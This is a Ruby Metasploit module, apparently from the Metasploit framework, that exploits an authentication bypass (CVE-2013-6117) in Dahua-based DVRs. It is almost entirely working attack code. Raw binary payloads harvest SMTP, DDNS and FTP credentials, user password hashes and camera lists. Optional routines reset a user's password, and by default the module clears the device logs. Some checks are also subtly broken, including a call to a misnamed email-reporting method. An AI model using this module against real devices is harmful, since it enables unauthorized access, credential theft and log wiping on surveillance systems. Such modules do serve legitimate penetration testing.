class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'            => %q(Dahua DVR Auth Bypass Scanner),
      'Description'     => %q(Scans for Dahua-based DVRs and then grabs settings. Optionally resets a user's password and clears the device logs),
      'Author'          => [
        'Jake Reynolds - Depth Security', # Vulnerability Discoverer
        'Tyler Bennett - Talos Infosec' # Metasploit Module
      ],
      'References'      => [
        [ 'CVE', '2013-6117' ],
        [ 'URL', 'https://depthsecurity.com/blog/dahua-dvr-authentication-bypass-cve-2013-6117' ]
      ],
      'License'         => MSF_LICENSE
       )
    deregister_options('RHOST')
    register_options([
      OptString.new('USERNAME', [true, 'A username to reset', '888888']),
      OptString.new('PASSWORD', [false, 'A password to reset the user with, if not set a random pass will be generated.']),
      OptBool.new('VERSION_INFO', ['false', 'Grabs the version of DVR', 'FALSE']),
      OptBool.new('EMAIL_INFO', ['false', 'Grabs the email settings of the DVR', 'FALSE']),
      OptBool.new('DDNS_INFO', ['false', 'Grabs the DDNS settings of the DVR', 'FALSE']),
      OptBool.new('SN_INFO', ['false', 'Grabs the SN of the DVR', 'FALSE']),
      OptBool.new('CHANNEL_INFO', ['false', 'Grabs the cameras and their assigned name', 'FALSE']),
      OptBool.new('NAS_INFO', ['false', 'Grabs the NAS settings of the DVR', 'FALSE']),
      OptBool.new('USER_INFO', ['true', 'Grabs the Users and hashes of the DVR', 'TRUE']),
      OptBool.new('GROUP_INFO', ['false', 'Grabs the Users and groups of the DVR', 'FALSE']),
      OptBool.new('RESET', [false, %q(Reset an existing user's pw?), 'FALSE']),
      OptBool.new('CLEAR_LOGS', [true, %q(Clear the DVR logs when we're done?), 'TRUE']),
      Opt::RPORT(37777)
    ])
  end

  U1 = "\xa1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
       "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  DVR_RESP = "\xb1\x00\x00\x58\x00\x00\x00\x00"
  # Payload to grab version of the DVR
  VERSION = "\xa4\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00" \
            "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  # Payload to grab Email Settings of the DVR
  EMAIL = "\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" \
          "\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  # Payload to grab DDNS Settings of the DVR
  DDNS = "\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" \
         "\x8c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  # Payload to grab NAS Settings of the DVR
  NAS = "\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" \
        "\x25\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  # Payload to grab the Channels that each camera is assigned to on the  DVR
  CHANNELS = "\xa8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
             "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
             "\xa8\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00" \
             "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  # Payload to grab the Users Groups of the DVR
  GROUPS = "\xa6\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00" \
           "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  # Payload to grab the Users  and their hashes from the DVR
  USERS = "\xa6\x00\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00" \
          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  # Payload to grab the Serial Number of the DVR
  SN = "\xa4\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00" \
       "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  # Payload to clear the logs of the DVR
  CLEAR_LOGS1 = "\x60\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00" \
               "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  CLEAR_LOGS2 = "\x60\x00\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00" \
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

  def setup
    @password = datastore['PASSWORD']
    @password ||= Rex::Text.rand_text_alpha(6)
  end

  def grab_version
    connect
    sock.put(VERSION)
    data = sock.get_once
    if data =~ /[\x00]{8,}([[:print:]]+)/
      ver = Regexp.last_match[1]
      print_status("Version: #{ver} @ #{rhost}:#{rport}!")
    end
  end

  def grab_sn
    sock.put(SN)
    data = sock.get_once
    if data =~ /[\x00]{8,}([[:print:]]+)/
      serial = Regexp.last_match[1]
      print_status("Serial Number: #{serial} @ #{rhost}:#{rport}!")
    end
  end

  def grab_email
    connect
    sock.put(EMAIL)
    if data = sock.get_once.split('&&')
      print_status("Email Settings: @ #{rhost}:#{rport}!")
      if data[0] =~ /([\x00]{8,}(?=.{1,255}$)[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?(?:\.[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?)*\.?+:\d+)/
        if mailhost = Regexp.last_match[1].split(':')
          print_status("  Server: #{mailhost[0]}") unless mailhost[0].nil?
          print_status("  Server Port: #{mailhost[1]}") unless mailhost[1].nil?
          print_status("  Destination Email: #{data[1]}") unless mailhost[1].nil?
        end
          if !data[5].nil? && !data[6].nil?
            print_good("  SMTP User: #{data[5]}") unless data[5].nil?
            print_good("  SMTP Password: #{data[6]}") unless data[6].nil?
            muser = "#{data[5]}"
            mpass = "#{data[6]}"
            mailserver = "#{mailhost[0]}"
            mailport = "#{mailhost[1]}"
            if !mailserver.to_s.strip.length == 0 && !mailport.to_s.strip.length == 0 && !muser.to_s.strip.length == 0 && !mpass.to_s.strip.length == 0
              report_email_creds(mailserver, mailport, muser, mpass) if !mailserver.nil? && !mailport.nil? && !muser.nil? && !mpass.nil?
            end
          end
      end
    end
  end

  def grab_ddns
    connect
    sock.put(DDNS)
    if data = sock.get_once
      data = data.split(/&&[0-1]&&/)
      data.each_with_index do |val, index|
        if index > 0
          val = val.split("&&")
          ddns_service = "#{val[0]}"
          ddns_server = "#{val[1]}"
          ddns_port = "#{val[2]}"
          ddns_domain = "#{val[3]}"
          ddns_user = "#{val[4]}"
          ddns_pass = "#{val[5]}"
          print_status("DDNS Settings @ #{rhost}:#{rport}!:")
          print_status("  DDNS Service: #{ddns_service}")
          print_status("  DDNS Server:  #{ddns_server}")
          print_status("  DDNS Port: #{ddns_port}")
          print_status("  Domain: #{ddns_domain}")
          print_good("  Username: #{ddns_user}")
          print_good("  Password: #{ddns_pass}")
          if !ddns_server.to_s.strip.length == 0 && !ddns_port.to_s.strip.length == 0 && !ddns_user.to_s.strip.length == 0 && !ddns_pass.to_s.strip.length == 0
            report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)
          end
        end
      end
    end
  end

  def grab_nas
    connect
    sock.put(NAS)
    if data = sock.get_once
      print_status("Nas Settings @ #{rhost}:#{rport}!:")
      server = ''
      port = ''
      if data =~ /[\x00]{8,}[\x01][\x00]{3,3}([\x0-9a-f]{4,4})([\x0-9a-f]{2,2})/
        server = Regexp.last_match[1].unpack('C*').join('.')
        port = Regexp.last_match[2].unpack('S')
        print_status("  Nas Server #{server}")
        print_status("  Nas Port: #{port}")
      end
      if data =~ /[\x00]{16,}(?<ftpuser>[[:print:]]+)[\x00]{16,}(?<ftppass>[[:print:]]+)/
        print_good("  FTP User: #{ftpuser}")
        print_good("  FTP Password: #{ftppass}")
        if !ftpuser.to_s.strip.length == 0 && ftppass.to_s.strip.length == 0
          report_creds(
            host: server,
            port: port,
            user: ftpuser,
            pass: ftppass,
            type: "FTP",
            active: true) if !server.nil? && !port.nil? && !ftpuser.nil? && !ftppass.nil?
        end
      end
    end
  end

  def grab_channels
    connect
    sock.put(CHANNELS)
    data = sock.get_once.split('&&')
    disconnect
    if data.length > 1
      print_status("Camera Channels @ #{rhost}:#{rport}!:")
      data.each_with_index { |val, index| print_status("  #{index + 1}:#{val[/([[:print:]]+)/]}") }
    end
  end

  def grab_users
    usercount = 0
    connect
    sock.put(USERS)
    if data = sock.get_once.split('&&')
      print_status("Users\\Hashed Passwords\\Rights\\Description: @ #{rhost}:#{rport}!")
      data.each do |val|
        usercount += 1
        pass = "#{val[/(([\d]+)[:]([0-9A-Za-z]+)[:]([0-9A-Za-z]+))/]}"
        value = pass.split(":")
        user = "#{value[1]}"
        md5hash = "#{value[2]}"
        print_status("  #{val[/(([\d]+)[:]([[:print:]]+))/]}")
        # Write the dahua hash to the database
        hash = "#{rhost} #{user}:$dahua$#{md5hash}"
        report_hash(rhost, rport, user, hash)
        # Write the vulnerability to the database
        report_vuln(
          host: rhost,
          port: rport,
          proto: 'tcp',
          sname: 'dvr',
          name: 'Dahua Authentication Password Hash Exposure',
          info: "Obtained password hash for user #{user}: #{md5hash}",
          refs: references
        )
      end
    end
  end

  def grab_groups
    connect
    sock.put(GROUPS)
    if data = sock.get_once.split('&&')
      print_status("User Groups: @ #{rhost}:#{rport}!")
      data.each { |val| print_status("  #{val[/(([\d]+)[:]([\w]+))/]}") }
    end
  end

  def reset_user
    userstring = datastore['USERNAME'] + ":Intel:" + @password + ":" + @password
    u1 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00\x00\x00\x00\x00" \
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    u2 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00" \
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    u3 = "\xa6\x00\x00\x00#{userstring.length.chr}\x00\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00" \
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + userstring
    sock.put(u1)
    sock.put(u2)
    sock.put(u3)
    data = sock.get_once
    sock.put(u1)
    if data = sock.get_once
      print_good("PASSWORD RESET!: user #{datastore['USERNAME']}'s password reset to #{datastore['PASSWORD']}! @ #{rhost}:#{rport}!")
    end
  end

  def clear_logs
    sock.put(CLEAR_LOGS1)
    sock.put(CLEAR_LOGS2)
    print_good("LOGS CLEARED! @ #{rhost}:#{rport}")
  end

  def run_host(ip)
    # user8pwhash = "4WzwxXxM" #888888
    # user6pwhash = "sh15yfFM" #666666
    # useradminpwhash = "6QNMIQGe" #admin
    connect
    sock.put(U1)
    data = sock.recv(8)
    disconnect
    if data == DVR_RESP
      print_good("DVR FOUND: @ #{rhost}:#{rport}!")
      report_service(host: rhost, port: rport, sname: 'dvr', info: "Dahua-based DVR")
      # needs boolean logic to run or not run
      if datastore['VERSION_INFO']
        grab_version
      end
      # needs boolean logic to run or not run
      if datastore['SN_INFO']
        grab_sn
      end
      # needs boolean logic to run or not run
      if datastore['EMAIL_INFO']
        grab_email
      end
      # needs boolean logic to run or not run
      if datastore['DDNS_INFO']
        grab_ddns
      end
      # needs boolean logic to run or not run
      if datastore['NAS_INFO']
        grab_nas
      end
      # needs boolean logic to run or not run
      if datastore['CHANNEL_INFO']
        grab_channels
      end
      # needs boolean logic to run or not run
      if datastore['USER_INFO']
        grab_users
      end
      # needs boolean logic to run or not run
      if datastore['GROUP_INFO']
        grab_groups
      end
      if datastore['RESET']
        reset_user
      end

      if datastore['CLEAR_LOGS']
        clear_logs
      end
      disconnect
    end
  end

  def report_hash(rhost, rport, user, hash)
    service_data = {
      address: rhost,
      port: rport,
      service_name: 'dahua_dvr',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      private_data: hash,
      private_type: :nonreplayable_hash,
      jtr_format: 'dahua_hash',
      username: user
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)
    service_data = {
      address: ddns_server,
      port: ddns_port,
      service_name: 'ddns settings',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      private_data: ddns_pass,
      private_type: :password,
      username: ddns_user
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def report_email_cred(mailserver, mailport, muser, mpass)
    service_data = {
      address: mailserver,
      port: mailport,
      service_name: 'email settings',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      private_data: mpass,
      private_type: :password,
      username: muser
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end
end
